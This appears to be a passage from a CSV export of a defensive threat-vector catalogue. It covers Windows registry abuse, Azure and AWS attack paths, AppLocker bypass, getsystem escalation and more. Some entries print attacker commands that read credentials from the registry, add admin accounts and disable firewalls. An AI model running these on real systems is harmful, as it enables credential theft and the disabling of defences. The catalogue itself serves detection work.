- HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer  
Setting `DisableTaskMgr`, `DisableRegistryTools`, `NoViewOnDrive` or
NoFind stops Task Manager, Regedit, search and drive browsing,
blinding users.
Setting `NavPaneShowAllFolders` or `NavPaneExpandToCurrentFolder` can 
modify the navigation pane.
When set to 0, this value hides certain folders in the navigation pane, 
such as system folders or folders that are not typically displayed,
making it difficult for users to detect malicious activity.
When set to 1, this value shows all folders in the navigation pane, 
including hidden and system folders, making it harder for users to 
distinguish between legitimate and malicious files or folders.

### Advanced Flags Hide Artefacts
- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced  
Flipping Hidden, ShowSuperHidden or SuperHidden hides system
files and payloads, thwarting GUI-based hunting.

### User Shell Redirection
- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders  
Replacing Desktop, Startup or Personal paths diverts files or
autoruns to attacker-controlled folders for theft or persistence.

### System-Wide Folder Hijack
- HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders  
System-level redirection funnels all users' documents and
shortcuts to rogue directories, enabling broad data capture.

### Global Advanced Flags Override
- HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced  
Modifying the machine hive mirrors the HKCU tweaks but forces
hidden-file suppression and other changes on every profile.

### Environment Variable Hijack
- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  
Altering %APPDATA%, %TEMP% or %DESKTOP% variables tricks apps
into saving data or loading DLLs from malicious locations.

### Namespace Injection
- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace  
Creating fake CLSID subkeys inserts rogue folders in Explorer,
luring users to launch payloads masked as system objects.

### Drive AutoRun Seeds
- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2    
Inserting AutoRun and command entries forces code execution
whenever a specific USB or network share is browsed.

### Default Shell Replacement
- HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  
Repointing the Shell value swaps explorer.exe for a malicious
binary, gaining control each time a user signs in.

### Enabling AutoPlay for Malicious Devices
- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers  
Changing the `DeviceType` or `Handler` settings can enable AutoPlay for specific 
devices, such as network shares, potentially executing malicious code.
",1,2025-07-11,2025-07-16,,,,[ICS] Wizard Spider,"T1112, T1547.001"
3435c5fd-1069-40ee-ae79-54c672ce454d,Azure - Virtual Machine Scripting,Threat Vectors,clear,"This threat vector refers to adversaries running scripts or commands directly 
on Azure virtual machines via built-in features, enabling malicious code execution 
and system compromise.

## Example Attack Scenario
An attacker gains access to Azure portal credentials (via phishing or leaked secrets), 
allowing privilege escalation to interact with the management plane of Azure resources. 
The attacker then uses features like **RunCommand**, **CustomScriptExtension**, 
or **Serial Console** to execute PowerShell or shell scripts directly on a targeted VM. 
For instance, leveraging **CustomScriptExtension**, the intruder injects a script 
to dump credentials, establish persistence, or exfiltrate sensitive files—all as SYSTEM user.

## Attack Goals and Impact
- The primary **goal** is to execute arbitrary commands with SYSTEM privileges, 
enabling full compromise of the VM and escalation to additional assets connected to the VM.
- **Impact** includes:
  - Data exfiltration (sensitive file theft, database dumps)
  - Persistence (deploying webshells, creating new users)
  - Lateral movement (pivoting from VM to network or cloud resources)
  - Disruption (cryptomining, ransomware deployment)
  - Evasion (disabling defenses on the VM level).

## Attack Flow and Methodology
1. The attacker identifies exposed or misconfigured Azure virtual machines, focusing 
  on accounts with management access.
2. - The attacker uses management plane operations: for example, `Microsoft.Compute/virtualMachines/runCommand/action`, 
  `Microsoft.Compute/virtualMachines/extensions/write`, or serial console access.
  - Executes malicious scripts (PowerShell, Bash) as SYSTEM.
3. - Harvests credentials, establishes persistence, or launches further attacks.
  - May leverage logging gaps to avoid detection, or clean up traces after execution.
4. - Activity can be detected via auditing specific events such as `Microsoft.Compute/virtualMachines/extensions/write` 
  or anomalous use of VM scripting features.
",1,2025-09-03,2025-09-04,,,"{'sequence::succeeds': ['140907eb-c9fb-4330-9d71-656422388b2b', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'sequence::preceeds': ['61ddc240-e5a6-4ca8-ae77-6b471b498913', '23f6a192-a25d-48b8-a235-7bb55e483682', 'b954303c-0ad0-4dc0-b5ca-492c3de9cd53', '8934c19a-954b-4dce-8081-0a6acca599f6']}","APT29, [Enterprise] Akira, APT19, APT28, APT29, [Enterprise] APT3, APT32, APT33, [ICS] APT38, APT39, APT41, APT42, APT5, [Enterprise] Aquatic Panda, [Enterprise] BlackByte, [Enterprise] Blue Mockingbird, [Enterprise] Chimera, Winter Vivern, Turla, Thrip","T1059, T1078, T1204"
2d3b113e-c6ad-492f-a6cb-1590a8d1191d,Use of a malicious lambda layer in AWS account lambda function,Threat Vectors,clear,"A Lambda layer is an archive containing additional code, such as libraries,
dependencies, or even custom runtimes that is are extract to the /opt directory in the execution environment of the function they are added to. While AWS provides a few layers, developers
may also create custom ones to share in their organization, or use an external one
by pointing to a particular ARN. Layers are immutable, meaning once they are
created, a version is made and further changes would bump the version.
A threat actor can compromise one or more lambda functions by centrally 
compromising a lambda layer used by one or more other AWS accounts. This 
can also be a third party lambda layer in use by EC accounts. 

Once a new version of a lambda layer exists, it can  get deployed 
via some trigger+action needed on the side of the lambda administrator, 
unless the threat actor controls credentials to deploy or update lambda 
functions.
",1,2022-11-22,2022-11-23,,,,,"T1648, T1195.001"
0834302b-90d3-45ec-95d1-3e41ec14f7c6,Listing passwords stored in registry,Threat Vectors,clear,"Listing passwords stored in the Windows Registry is a technique employed by adversaries 
to extract sensitive credentials from compromised systems. The Windows Registry is a 
centralized database that stores configuration settings and options for the operating 
system and installed applications. Some applications, due to misconfigurations or poor 
security practices, store user credentials in the registry, sometimes in plaintext 
or in an easily reversible format.  

Threat actors may use the built-in Windows command-line utility reg.exe to query registry 
keys that potentially contain stored credentials.  

```bat
reg query HKLM /f password /t REG_SZ /s
```
This command is scanning registry hives for the value password.  

PowerShell provides a powerful scripting environment that can recursively search the 
registry for keys containing specific terms like ""password.""  

```powershell
Get-ChildItem -Path Registry:: -Recurse -ErrorAction SilentlyContinue |
Get-ItemProperty |
Where-Object { $_.PSObject.Properties.Name -match ""Password"" -and $_.Password }
```
This script searches all registry keys for properties named ""Password"" and lists them if found.  

Some applications store credentials in specific registry locations. For example, 
VPN clients or database tools might store user credentials under their software keys in HKCU or HKLM hives.
",1,2024-11-27,2024-11-27,,,,"[Enterprise] APT32, APT32, [Mobile] APT28, APT28, [Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [Enterprise] Turla, Turla",T1552.002
e2d8ce6b-f21e-4444-a828-0c6b722a9c93,Local user account added,Threat Vectors,clear,"Threat actors may add or modify local user accounts on compromised systems to 
establish persistence, maintain unauthorized access, and potentially 
escalate privileges. By leveraging administrative permissions—often obtained 
through credential theft, exploitation of vulnerabilities, or lateral movement—
adversaries create new user accounts that allow them to re-enter the system 
at will, even if initial malware implants or other backdoor mechanisms 
are detected and removed.  

## Windows

Adversaries might run commands like :
```bash
net user /add [username] [password] 
or 
net localgroup administrators [username] /add
```

To stealthily provision accounts with elevated permissions. 

## Linux or macOS

Threat actors may modify :
```bash
/etc/passwd
or 
/etc/shadow
``` 
or use commands like `useradd` or `dscl` to create new users.
The changes perfomed by using the above commands can be detected by 
monitoring certain paths, such as `/usr/sbin/useradd`.  
In some cases, attackers may script these actions to occur automatically during 
their post-exploitation phase, making detection more challenging.  

In practice, once these local accounts are established, the attackers can 
maintain a foothold within the environment, pivot to other hosts, 
exfiltrate data, or stage further attacks. The long-term impact of such 
account additions may lead to data breaches, reputation damage, financial 
loss and regulatory consequences.  
",1,2024-12-12,2024-12-13,,,,,T1136.001
22c2fc38-93f5-41ee-be2d-a7737fa2b936,Cron manipulation,Threat Vectors,clear,"Suspicious cron activity refers to the insertion or modification of scheduled tasks
(cron jobs) on Unix-like systems (including Linux and macOS) in order to achieve 
or maintain unauthorized persistence. This technique takes advantage of the legitimate 
cron scheduling service to run malicious commands at regular intervals.  

In practice, a threat actor will add a hidden or obfuscated entry to `/etc/crontab`, 
user-specific cron files (e.g., `/var/spool/cron/`), or 
system-wide cron directories (e.g., `/etc/cron.d/`). 
These hidden entries often execute scripts that download additional malware, 
exfiltrate data, or establish a persistent backdoor.

Some known threat actors has leveraged cron-based jobs to deploy cryptocurrency miners 
and move laterally within compromised environments, often targeting cloud-based 
or containerized setups. 
Attackers have also been identified using stealthy cron modifications to maintain 
a foothold on victim systems, execute remote commands, and ensure that malicious binaries 
are relaunched even after a reboot.
",1,2025-01-03,2025-01-03,,,,"[Enterprise] TeamTNT, TeamTNT, [ICS] APT38, Lazarus Group, [ICS] Wizard Spider, UNC1878",T1053.003
a1a17bd4-ec7e-4302-aedf-96ee7c436065,Self-Service Password Reset (SSPR) abuse in Azure AD,Threat Vectors,clear,"Self-service password reset (SSPR) is an Azure AD feature that allows users to
reset their password without the involvement of an administrator or help desk. 
It is designed for convenience and productivity so that users who forgot their
password or get locked out can easily reset it themselves with minimal friction.

Administrators are able to configure SSPR for the entire organization or a subset 
of groups via the Azure portal. They can also define requirements for permitted 
forms of verification and the number of verification methods required to perform 
the reset.

## methods

There are two primary methods through which adversaries have been abusing this tool:

- SIM swapping to gain initial access
- Attacker registered MFA to establish persistence

SIM swapping is an increasingly popular tactic that adversaries use to take 
control of a target phone number. This typically involves social engineering a
mobile carrier in order to initiate a number transfer to a new SIM card or
bribing internal employees to execute a swap. 

If an adversary controls the card and the organization SSPR is configured to
only require a single verification method, attackers should have no problem 
establishing initial access and enroll their own MFA methods for persistence,
typically mobile authenticator applications or disposable emails.


## reconnaisance

Successful SIM swapping needs sufficient preliminary SSPR reconnaissance to
identify a viable target. Aside from requiring the information to social engineer
a mobile carrier, the adversary needs to determine whether or not the target is
even susceptible to SSPR abuse.

Given any email address, it is easy to validate if it is a valid Microsoft 365 
account. The below curl command can be used to determine if a given email address
is a managed account in Microsoft 365:

curl -s -X POST https:///login.microsoftonline.com/common/GetCrede... –data ‘{“Username”:”user@domain.com”}’

Once valid Microsoft 365 accounts are identified, attackers initiate the SSPR flow
to see which verification options are available. Attackers likely need to perform
this recon as well if they are going to spend the time and effort performing the
initial SIM swap.

The Microsoft interface that appears during a SSPR clearly indicates whether one 
or two verification methods are required, making it easier for attackers to select
vulnerable target accounts. 
",1,2024-10-23,2024-11-13,,,"{'sequence::succeeds': ['6a7a493a-511a-4c9d-aa9c-4427c832a322'], 'atomicity::implements': ['4a807ac4-f764-41b1-ae6f-94239041d349']}","[Mobile] LAPSUS$, LAPSUS, [Enterprise] APT29, UNC2452",T1621
48432b70-77c4-4f5a-9d66-75764c1777c6,Modify Microsoft Sentinel Data Connector to impair Detections,Threat Vectors,clear,"A threat actor may want to disable, remove or update the configuration of
Sentinel Connectors to act invisibly in Azure, which would impair the ability
of a SOC to receive alerts since it would stop log file ingestion into Azure
Sentinel. 

An attacker can do this either by deploying via API an ARM template, biceps
template, or other script/code element that can be used via Azure APIs,
using the Azure CLI or directly on the portal itself via a browser.
",1,2022-12-08,2022-12-08,,,,,T1562.008
024a10fb-fc65-485b-9d7c-98a2372d75c0,Jailbreak Tools for iOS,Threat Vectors,clear,"Jailbreaking an iPhone involves bypassing Apple's security restrictions to gain 
root access to the device, allowing users to install unauthorized apps, tweaks, 
and customizations. While this can provide enhanced functionality, it also introduces 
significant security risks. Below is an analysis of the threat vector associated 
with jailbreaking tools based on the provided sources.

### Jailbreaking Tools

Jailbreaking tools exploit vulnerabilities in iOS to remove Apple's restrictions. 
These tools vary depending on the iOS version and device type. For example:
- **Taurine** works for iOS 14.0–14.8.1.
- **Dopamine 2.x** supports iOS 15.0–16.6.1 on certain devices.
- **PaleRa1n** is used for older devices (A11 and below) running iOS 15–17.

These tools often leverage kernel vulnerabilities to enable capabilities such as 
tweak injection, theming, and sideloading apps.

### Types of jailbreaks:

1. Tethered jailbreak: Requires the device to be connected to a computer to boot into
    a jailbroken state.

2. Semi-tethered jailbreak: Allows the device to boot into a jailbroken state without
   being connected to a computer, but may require a computer to re-jailbreak the device
   after a reboot.

3. Untethered jailbreak: Allows the device to boot into a jailbroken state without being
   connected to a computer, and the jailbreak is preserved even after a reboot.

### Security Risks of Jailbreaking

1. **Exploitation of Vulnerabilities**:
  - Jailbreaking tools exploit known vulnerabilities in iOS, which inherently weakens 
  the device's security posture. Once jailbroken, the device becomes more susceptible 
  to malware and unauthorized access.

2. **Loss of System Integrity**:
  - Jailbreaking modifies the core system files, potentially leading to instability, 
  crashes, or bricking of the device.

3. **Exposure to Malicious Software**:
  - Many jailbreak tweaks and apps are distributed outside of Apple's App Store, 
  increasing the risk of installing malicious software.

4. **Bypassing Security Features**:
  - Features like Secure Enclave and sandboxing are compromised in a jailbroken 
  environment, exposing sensitive data such as passwords and encryption keys.

5. **No Official Support**:
  - Apple does not support jailbroken devices, leaving users without official updates 
  or security patches.

### Current Status of Jailbreak Tools
- For newer iOS versions (iOS 17 and 18), no full jailbreak tools are publicly available 
yet. However, semi-jailbreak solutions like MisakaX and Nugget exist for limited customization.
- Older versions (iOS 15 to 16) have stable jailbreaks like Dopamine and PaleRa1n with 
tweak support.
",1,2025-04-09,2025-04-16,,,,,"T1630.003, T1398"
be73532a-1994-4db2-945e-ccdf586e2551,Tampering system firewall on endpoint,Threat Vectors,clear,"The firewall is a foundational defensive mechanism designed to control inbound and 
outbound network traffic based on predefined security rules. By disabling 
or tampering with these rules, adversaries effectively remove a key layer of network 
segmentation and monitoring. This action can allow them to pivot laterally, exfiltrate 
data without triggering alerts, or execute follow-on attacks with minimal interference 
from host-based defenses.  

## Windows 

An attacker with administrative privileges may execute commands such as 
`netsh advfirewall set allprofiles state off` or directly manipulate registry keys :
(`HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy`) 
to turn off or weaken firewall profiles. 
They may also employ PowerShell scripts or WMI-based methods to silently adjust rules.  

## Linux 

Threat actors might run commands like :
`iptables -F` (flush all rules), `iptables -P INPUT ACCEPT`, 
or tamper with `/etc/iptables.rules` files to ensure that all traffic is allowed. 

On some distributions, adjusting systemd firewall services or security daemons 
can achieve the same effect.  

## macOS

Attackers could use the `pfctl` command (e.g., `sudo pfctl -d`) to disable the 
Packet Filter firewall, or modify system configuration files that govern firewall rules. 
They may also exploit launch daemons or kernel extensions to bypass 
or remove firewall protections.  
",1,2024-12-16,2024-12-16,,,,"[Enterprise] APT29, UNC2452, [ICS] APT38, Lazarus Group, [ICS] Wizard Spider, UNC1878",T1562.004
a8c7b250-a2d4-4a0d-82f8-23dc99c77d7b,Addition of credentials to OAuth applications and service principals,Threat Vectors,clear,"The actor has been observed adding credentials (x509 keys or password
credentials) to one or more legitimate OAuth Applications or Service
Principals, usually with existing Mail.Read or Mail.ReadWrite permissions,
which grants the ability to read mail content from Exchange Online via
Microsoft Graph or Outlook REST. Examples include mail archiving
applications. Permissions are usually, but not always, AppOnly.

The actor may use their administrator privileges to grant additional
permissions to the target Application or Service Principal (e.g.  Mail.Read,
Mail.ReadWrite).",4,2022-02-21,2025-01-01,,,,"[Enterprise] APT29, UNC2452",T1098.001
b663b684-a80f-4570-89b6-2f7faa16fece,Abuse of Microsoft Office Applications,Threat Vectors,clear,"An employee named receives an email that appears to be from a trusted business 
partner or colleague. The email contains an office document. The end-user clic on it.

The attached file, is a macro-enabled Word document. It usually pops-up with 
the following message :
""This document was created in an earlier version of Microsoft Word. 
Please click 'Enable Content' above to view the full document.""

This message is designed to entice end-user to enable macros or active content, 
which is disabled by default for security reasons.

By clicking ont it, it allows the embedded macro, written in 
Visual Basic for Applications (VBA), to execute without further prompts.

Once executed, the macro initiates a hidden process that launches Windows PowerShell, 
which run:

- Run silently without displaying a window to the user.
- Bypass execution policies that normally restrict script running.
- Connect to an external server controlled by the attacker.
- Download and execute additional malicious code or a payload.

Threat actors may also modify Windows Registry settings related to 
Microsoft Office security.

- Disabling the COM Kill Bit: This involves changing registry values 
that control the activation of certain COM objects or ActiveX controls 
within Office applications. By disabling the ""kill bit,"" the threat actor 
re-enables outdated or vulnerable components that can be exploited.

- Altering Macro Security Settings: Changing registry keys to lower the 
macro security level, allowing macros to run without prompts in the future.

To maintain long-term access to the compromised system, 
the attacker may target Microsoft Outlook.

- Embedding Malicious Code in Outlook's VBA Project:
- The attacker adds VBA code to Outlook's VbaProject.otm file.
This code executes every time Outlook starts, performing actions without the user's knowledge.",1,2024-10-31,2024-10-31,,,{'sequence::succeeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']},"[Mobile] APT28, APT28, [Enterprise] APT29, UNC2452, [ICS] FIN7, FIN7, [Enterprise] TA505, TA505, [ICS] Wizard Spider, UNC1878","T1059.005, T1204.002, T1137, T1203"
bc5aed0c-a2d1-4406-9a47-0721f3753a3b,Protocol based DDoS attack,Threat Vectors,clear,"Threat actors may wish to cause business disruption, media/public attention, or to use the pretense of business disruption to disguise other activities. Any DDoS attack should always be followed up with other DFIR activities to determine if the attack was meant to distract from something else. DDoS can distract by pulling attention away, or even by spooling out log files so that relevant entries are overwritten.",1,2023-01-26,2023-02-03,,,,"[Mobile] APT28, APT28",T1498.001
4d6104e3-10d4-4a12-b081-d937df848891,Web Shell Attacks,Threat Vectors,clear,Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.,1,2022-07-08,2025-10-01,,,,"[Enterprise] APT29, UNC2452",T1505.003
9a1aeae5-912e-492c-b5d4-8bce91a95dae,AppLocker enumerating policy bypass,Threat Vectors,clear,"Enumerating policy bypass in AppLocker refers to the process of identifying
and exploiting weaknesses or vulnerabilities in AppLocker policies to run
unauthorised applications.    

A threat actor can use various methods and tools to enumerate AppLocker
policies with the goal to find weaknesses in this protection mechanism and
to exploit its whitelisting. Some of them are listed below.

### Bypass AppLocker policies

- Renaming executables method - renaming malicious executables to match the
name of an allowed application. In this way a threat actor can hide their
real malicious executables and intend in order to bypass AppLocker policies. 
- Using alternative executable extensions - using alternative executable
extensions, such as .scr or .pif, to bypass AppLocker rules.
- Enumeration of AppLocker policies tools - a threat actor can use different
enumeration tools to check if AppLocker policies are on place and what they
are blocking.

### Enumerating AppLocker policies

AppLocker policies can be enumerated using the registry query functionality,
as show below ref [5],[6]:  

'reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\'

### Known tools for AppLocker policy enumeration

AppLocker is a Windows feature that allows administrators to control which
applications can run on a device. Threat actors often try to bypass or
enumerate AppLocker policies to execute malicious code.

- PowerShell: PowerShell is a powerful tool that can be used to enumerate
AppLocker policies. Threat actors can use PowerShell cmdlets like
`Get-AppLockerPolicy` to retrieve AppLocker policies and
`Test-AppLockerPolicy` to test whether a specific application is allowed
to run.
- AppLocker Bypass Tools: There are several tools available online that can
bypass AppLocker policies. For example, the tool named `AppLockerBypass` is
a tool that uses various techniques to bypass AppLocker policies. Another
tool used for this purpose is `BypassAppLocker`. This tool uses PowerShell
to bypass AppLocker policies.
- MSBuild: MSBuild is a legitimate Windows utility that can be used to build
and execute code. Threat actors can use MSBuild to bypass AppLocker policies
by executing malicious code.
- Rundll32 : RunDLL is a legitimate Windows utility that can be used to execute
dll. Threat actors can use RunDLL to bypass AppLocker policies.
- Regasm/Regsvr32: Regasm and Regsvr32 are legitimate Windows utilities that
can be used to register and execute DLLs. Threat actors can use these tools
to bypass AppLocker policies by executing malicious DLLs.
- Certutil: Certutil is a legitimate Windows utility that can be used to
manage certificates. Threat actors can use Certutil to bypass AppLocker
policies by executing malicious code.
- Wscript/Cscript: Wscript and Cscript are legitimate Windows utilities that
can be used to execute scripts. Threat actors can use these tools to bypass
AppLocker policies by executing malicious scripts.
- Invoke-AppLockerBypass: This is a PowerShell script that uses various
techniques to bypass AppLocker policies.
- SharpAppLocker: This is a C# tool that can be used to bypass AppLocker
policies.
- WinPEAS - WinPEAS is a powerful tool that can be used to audit and bypass
Windows security features, including AppLocker policies. For more details
related to WinPEAS Applocker enumeration usage check ref [2].  
",1,2025-07-11,2025-07-11,,,,"[Enterprise] APT29, APT29",T1218
9edfeee4-63ee-49cc-ab7f-43a7e602ab58,Azure - SAS URI Generation,Threat Vectors,clear,"The following threat vector enables attackers to exfiltrate or manipulate data by 
generating Shared Access Signature (SAS) URIs for Azure resources such as virtual 
machine disks or storage containers, often without authentication or sufficient oversight.

## Example Attack Scenario

An adversary with sufficient Azure permissions compromises a resource (like a VM 
or storage account) and generates an SAS URI for the VM disk or storage container. 
The attacker then uses the generated SAS URI to download or exfiltrate sensitive 
data, such as disk images containing credentials or proprietary information. For 
example, a well-publicized incident involved researchers leaking terabytes of confidential 
data after distributing SAS-protected links with overly broad permissions.

## Attack Goals and Impact

- The key **attack goal** is **data exfiltration** or unauthorized access to sensitive 
data without detection or need for ongoing authentication.
- Attackers can download full VM disks, access entire storage containers, manipulate 
data, or even inject and delete files if permission scopes are broad.
- **Impact** includes extensive data breaches, loss of intellectual property, ransom 
demands, or irreparable harm due to deletion or manipulation of business-critical resources.
- SAS URIs are particularly dangerous because, once generated, they can't be easily 
revoked, and their permissions/duration may be overprovisioned by design or accident.

## Attack Flow and Methodology

1. **Privilege Acquisition**: Attacker gains access to an Azure resource or user 
account with permissions to generate SAS URIs.
2. **SAS Generation**: Using privileged actions (such as 'Microsoft.Compute/disks/beginGetAccess/action' 
for VM disks or 'Microsoft.Storage/storageAccounts/listAccountSas/action' for Storage Accounts), 
the attacker generates a SAS URI for the target resource.
3. **Data Access or Exfiltration**: The attacker uses the SAS URI to access, download, 
modify, or delete data directly, often bypassing logging or security controls if 
not properly monitored.
4. **Persistence and Stealth**: Since SAS URIs can have long or indefinite validity 
periods and are rarely tracked, the attacker maintains ongoing access until the 
token expires or underlying keys are rotated.
5. **Cleanup or Covering Tracks**: In advanced scenarios, the attacker removes evidence 
of token generation and exfiltration or uses the access to establish further persistence 
within the environment.
",1,2025-09-11,2025-09-11,,,"{'atomicity::implemented': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2d7ed070-e5c5-4796-b150-ea1d02ed1785', '2d7ed070-e5c5-4796-b150-ea1d02ed1785'], 'support::enabled': ['3435c5fd-1069-40ee-ae79-54c672ce454d']}",,"T1537, T1078.004, T1098.001"
3088db32-843b-439f-9374-f8c04a82b2ec,LNK files downloaded on a workstation,Threat Vectors,clear,"A malicious .lnk file can be crafted to execute arbitrary code, download
malware, or exploit vulnerabilities in the operating system. The threat
actors can use social engineering tactics to trick users into downloading
and opening these files, which can lead to some of the following threats
ref [1], [2]:

- Malware infection: The .lnk file can download and install malware,
such as viruses, Trojans, or ransomware, onto the workstation.
- Code execution: The file can execute malicious code, potentially
allowing attackers to gain control of the workstation or steal sensitive
data.
- Exploitation of vulnerabilities: Malicious .lnk files can exploit known
vulnerabilities in the operating system or applications, leading to further
compromise.

In one of the observed and reported threat actor cyber-espionage campaigns
a North Korean threat actor spreads spear-phishing e-mails containing a link
to a password-protected document which contains LNK file.  

The lure contains a e-mail with a title ""Political Advisory Meeting to
be held at the EU Delegation on May 14."" This was both the e-mail subject
and the name of a zip file sent through a Dropbox link. The mail contains
a password-protected zip file with included .lnk file in it. Once an end-
usr click this file, it will download a payload usually from a GitHub 
repository. Further the payload executes and infect the host.   
",1,2025-05-23,2025-05-23,,,{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df']},"[Enterprise] Kimsuky, Kimsuky","T1566.002, T1027, T1204"
d24f2b4a-80fc-4ee7-9293-3f6e9e3bbbe4,Adversary publishing malicious NPM packages to compromise software,Threat Vectors,clear,"Threat actors use a technique which includes updating of NPM packages
with malicious code to deceive a developer or an end-user to download
and install them. This attack vector is used to steal profile and
system data from the developer's systems.    

In one of the threat actor's campaigns was observed that multiple
cryptocurrency-related packages are targeted, and the popular
country-currency-map package was downloaded thousands of times
a week. The malicious code is found in two heavily obfuscated
scripts, ""/scripts/launch.js"" and ""/scripts/diagnostic-report.js,""
which execute upon the package installation ref [1].    

The threat actor steals the device's environment variables and sends
them to a remote host. The threat actor's groups are targeting environment
variables as they can contain API keys, database credentials, cloud
credentials, and encryption keys, which can be used for further attacks.",1,2025-04-09,2025-04-24,,,{'atomicity::implements': ['b6887f4b-eeae-462c-a2ac-7454efb5eabc']},"TraderTraitor, Lazarus Group","T1195, T1082, T1546.016, T1036"
197c06c8-7959-4e28-9ede-b3e7b6f13442,AppLocker bypass,Threat Vectors,clear,"### AppLocker rules types 

AppLocker can be found from within the Group Policy Management at _Local Computer Policy ->
Computer Configuration -> Windows Settings -> Security Settings -> Application Control Policies_.
Four rule types are available:  
- Executable rules: enforces the rules for executable files (`.exe`).
- Windows Installer rules: enforces the rules for windows installer files (`.msi`).
- Script rules: enforces the rules for PowerShell, JScript, VB and older file formats (`.cmd`, `.bat`).
- Package app rules: enforces the rules for packages that can be installed through Microsoft Store.

### Enumerating AppLocker policies

AppLocker policies can be enumerated using the registry query functionality, as show below:
`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\`

## Several strategies are available:


### Bypassing leveraging trusted folders

There are several writable folders within `C:\WINDOWS` where standard users have write permissions by default.
`accesschk.exe` from Sysinternals Suite can be used to find folders that are writable and can be leveraged.
Furthermore, `icacls.exe` can be used to determine if we also have execute rights within the targeted folder.
By moving a binaryfile (for example) to the folder with execute rights, it is possible to execute the binary.

### Bypassing using DLLs

From the initial setup there was no option of blocking out DLLs by default, resulting in another way of bypassing
the application whitelisting. Note that AppLocker configuration can be further tweaked to restrict the usage of
DLLs by enabling DLL rule collection from within the AppLocker properties.

### Bypassing using Alternate Data Stream

Another method to bypass AppLocker involves embedding an executable into another file, known as an 
alternate data stream (ADS), and then executing the EXE from the ADS. AppLocker rules do not prevent executables
from running within an ADS.

### Bypassing using third parties

Third party tools or software can be used to bypass the AppLocker policy. However, this is conditional, as it
requires the system to have installed these tools on it. An example would be using Python or Perl.
",2,2025-02-04,2025-07-23,,,"{'atomicity::implemented': ['9a1aeae5-912e-492c-b5d4-8bce91a95dae', 'ff8c52ac-77d0-4bee-9f6d-e40fc6e0da63', 'a73c2506-8584-4c0b-bfdc-52e33c8bd229']}","Lazarus Group, Volt Typhoon",T1218
49625e57-94e0-4185-8466-ac68fe15b7e1,Abuse of Getsystem command for privilege escalation,Threat Vectors,clear,"Use of Getsystem command to elevate from a local administrator to the SYSTEM user.
There are different tools to do this, most popular are Cobalt Strike beacons and 
Metasploit Meterpreter payload.

Both tools first attempt to use “named pipe impersonation” to achieve SYSTEM privileges.
This involves creating a Windows Service to execute as NT AUTHORITY\SYSTEM and feeding
data to it through a named pipe that is randomly created by the malicious payload.

The getsystem command has three techniques. The first two rely on named pipe impersonation.
The last one relies on token duplication.

## Technique 1.

It creates a named pipe from Meterpreter. It also creates and runs a service that runs
cmd.exe /c echo “some data” >\\.\pipe\[random pipe here]. When the spawned cmd.exe connects
to Meterpreter’s named pipe, Meterpreter has the opportunity to impersonate that security 
context. Impersonation of clients is a named pipes feature. 
The context of the service is SYSTEM, so when you impersonate it, you become SYSTEM.

## Technique 2.

It is like technique 1. It creates a named pipe and impersonates the security context of
the first client to connect to it. To create a client with the SYSTEM user context,
this technique drops a DLL to disk(and schedules rundll32.exe as a service to run the
DLL as SYSTEM. The DLL connects to the named pipe.

## Technique 3.

It is a little different. This technique assumes you have SeDebugPrivileges—something getprivs
can help with. It loops through all open services to find one that is running as SYSTEM and
that you have permissions to inject into. It uses reflective DLL injection to run its elevator.dll
in the memory space of the service it finds. This technique also passes the current thread id 
(from Meterpreter) to elevator.dll. When run, elevator.dll gets the SYSTEM token, opens the primary 
thread in Meterpreter, and tries to apply the SYSTEM token to it.

This technique’s implementation limits itself to x86 environments only. On the bright side, 
it does not require spawning a new process and it takes place entirely in memory.
",2,2025-02-03,2025-02-04,,,,"[Enterprise] Aquatic Panda, [Enterprise] Cobalt Group, [Enterprise] Cinnamon Tempest, [Enterprise] LuminousMoth, MUSTANG PANDA, APT32, ToddyCat, APT19, TA505, CopyKittens, DarkHydrus, Mustard Tempest, APT41, APT10, FIN7, Sandworm, APT40, APT29, APT37, WIZARD SPIDER, INDRIK SPIDER",T1134.002
fa381d6e-92cd-4c96-a340-24df7b21e2b7,Azure - Privileged Identity Management Role,Threat Vectors,clear,"The threat vector describes the risk that an adversary may escalate privileges by 
abusing Privileged Identity Management (PIM) assignments or role activation features 
within Azure Active Directory. PIM is designed to provide just-in-time and approval-based 
access to highly privileged roles (e.g., Global Administrator, Owner), instead of 
permanent assignment. However, if misconfigured or insufficiently monitored, PIM 
itself can become an avenue for privilege escalation attacks.

### Example Attack Scenario

An attacker gains access to a regular Azure AD user account that is configured as 
eligible for privileged role activation (such as Global Administrator) through PIM. 
The attacker then activates the privileged role via Azure AD PIM, immediately acquiring 
elevated permissions. This could be done by interacting with Azure Graph API endpoints 
to trigger role eligibility schedules and activations, such as:

- `GET https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilitySchedules/{id}`
- `GET https://management.azure.com/{scope}/providers/Microsoft.Authorization/roleEligibilityScheduleRequests/{roleEligibilityScheduleRequestName}?api-version=2020-10-01`

The attacker uses the newly gained privileges to:
- Add themselves or an accomplice as a permanent or eligible member for other privileged roles.
- Carry out further attacks with escalated access.[1]

### Attack Goals and Impact

The main goals of abusing a PIM role assignment include:
- **Persistence:** Staying undetected with elevated privileges for longer periods.
- **Privilege Escalation:** Obtaining admin-level access across Azure AD and resources.
